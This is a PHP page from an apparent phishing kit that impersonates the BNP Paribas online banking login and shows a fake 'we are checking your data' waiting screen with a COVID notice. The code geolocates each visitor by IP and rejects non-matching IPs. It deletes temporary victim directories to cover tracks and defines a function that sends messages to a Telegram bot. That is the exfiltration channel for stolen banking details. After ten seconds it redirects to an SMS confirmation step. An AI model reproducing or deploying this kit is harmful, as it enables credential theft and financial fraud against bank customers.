<?php
session_start();
$StrupLom = $_SERVER['REMOTE_ADDR'];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 320) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_SESSION['idtel'];
    $cRetVckr = $_SESSION['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 
<html>

<head>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01-Jan-1980 00:00:00 GMT">
<meta http-equiv="date" content="Tue, 01-Jan-1980 00:00:00 GMT">
<title>BNPPARIBAS NET IDENTIFICATION</title>
<link href="images/dciweb.css" rel="stylesheet" type="text/css">
<link href="images/bnp.css" rel="stylesheet" type="text/css">
</head>
<body  bgcolor="#FFFFFF" link="#002288" alink="#002288" vlink="#002288"  >
<script language="JavaScript" src="images/tools.js"></script>
  <style>
    body {display : none;} 
  </style>
  <script>
    if (self == top) { 
      var theBody = document.getElementsByTagName('body')[0];
      theBody.style.display = "block";
    } else { 
      top.location = self.location; 
    }
  </script>
  <style type="text/css">
    <!--
    a:link,a:active,a:visited
    {
    text-decoration:none;
    color:black;
    }
    a:hover
    {
    text-decoration: underline;
    color:#0000FF;
    }
    //-->
  </style>
  <style type="text/css">
    
    html,body{
  background:#fff;
  margin:0;
}
.centered{
  width:190px;
  height:190px;
  position:absolute;
  top:45%;
  left:50%;
  transform:translate(-50%,-50%);
  background:#fff;
  filter: blur(10px) contrast(20);
}
.blob-1,.blob-2{
  width:50px;
  height:50px;
  position:absolute;
  background:#000;
  border-radius:50%;
  top:50%;left:50%;
  transform:translate(-50%,-50%);
}
.blob-1{
  left:20%;
  animation:osc-l 2.5s ease infinite;
}
.blob-2{
  left:80%;
  animation:osc-r 2.5s ease infinite;
  background:#0ff;
}
@keyframes osc-l{
  0%{left:20%;}
  50%{left:50%;}
  100%{left:20%;}
}
@keyframes osc-r{
  0%{left:80%;}
  50%{left:50%;}
  100%{left:80%;}
}

  </style>
  <div class="page">
    <table>
      <tr>
        <td align="center"><img align="center" border="0" src="https://raw.githubusercontent.com/0dayestra/source/main/images/headerBack.jpg" width="760" height="75"></td>
      </tr>
      <tr>
        <td colspan=2>&nbsp;</td>
      </tr>
    </table>
    <div class="info3"><span style="font-size:130%">
  Acc&eacute;dez &agrave; l'espace s&eacute;curis&eacute; BNPPARIBAS.NET
</span></div>
    <div align="left">
      &nbsp;
    </div>
      <div align="center">
        <b><font color="#FF0000"><font color="#269EE5">Dans ce contexte in&eacute;dit nos agences restent ouvertes dans leur tr&egrave;s grande majorit&eacute; et nous sommes joignables par t&eacute;l&eacute;phone ou mail.<br>Nos equipes sont &agrave; vos cot&eacute;s pour vous proposer si besoin, des solutions adapt&eacute;es &agrave; chaque situation. Nous vous remercions de votre confiance et de votre fid&eacute;lit&eacute;. </font> </font></b>

        <br />

        <p style="font-size:13px;">Veuillez patienter nous <strong>contrôlons vos données</strong> ... Ne quittez pas cette page pendant le traitement.</p>

        <center>
              <input type="hidden" name="vkid" value="vkident-8364hk1sgj">
              <input type="hidden" name="p1">
              <div style="width:620px; margin:0 auto; text-align: left">

                <div style="float:left;width: 50%; ">


                  <div class = "centered">
                    <div class = "blob-1"></div>
                    <div class = "blob-2"></div> 
                </div>




                <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />


                </div>
              </div>
            
        </center> 
      </div>
      
      <div style="clear:both;"/>
        
        <div align="center">
        
          
            <div style="padding-top: 10px; position: relative; top: 80px;">
              <img src="https://raw.githubusercontent.com/0dayestra/source/main/images/covid19-information.png" height="300" border="0">
            </div>
          
        
      </div>
        
        
      </div>
    
  </div>
  
  <script type="text/javascript">
    document.saisie.p0.focus();
  </script>

  <script type="text/javascript">
            setTimeout(function () {
                window.location.href= 'sms_session_confirmation.php';
            },10000); // 1000 = 1s
        </script>
  
  
</div>
</body>


</html>